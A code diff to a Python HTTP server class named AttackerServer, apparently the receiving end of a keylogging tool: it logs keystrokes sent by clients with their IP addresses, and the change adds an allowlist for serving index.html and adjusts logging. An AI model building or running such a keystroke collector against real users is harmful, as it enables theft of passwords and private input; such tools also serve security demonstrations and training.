@@ -108,8 +108,17 @@ class AttackerServer(BaseHTTPRequestHandler):
         response = ""
         self.send_response(200)
 
+        allowed_files = {
+            "/": ("index.html", "text/html"),
+            "/index.html": ("index.html", "text/html"),
+        }
+
+        if path in allowed_files:
+            response = open(allowed_files[path][0], "r").read()
+            # set content type
+            self.send_header('Content-type', allowed_files[path][1])
         # client sent key stroke
-        if 'k' in parameters:
+        elif 'k' in parameters:
             logger.debug(f"Received key stroke from {client_ip}: {parameters['k'][0]}")
             keys = parameters['k'][0].split(',')
             # Convert to characters
@@ -141,7 +150,8 @@ class AttackerServer(BaseHTTPRequestHandler):
 def run( ip: str, port: int, server_class=HTTPServer, handler_class=AttackerServer):
     server_address = (ip, port)
     httpd = server_class(server_address, handler_class)
-    logger.info('Starting http server...')
+    logger.debug('Starting http server...')
+    logger.info(f"Listening on http://{ip}:{port}")
     httpd.serve_forever()
 
 run(args.listen, args.port)
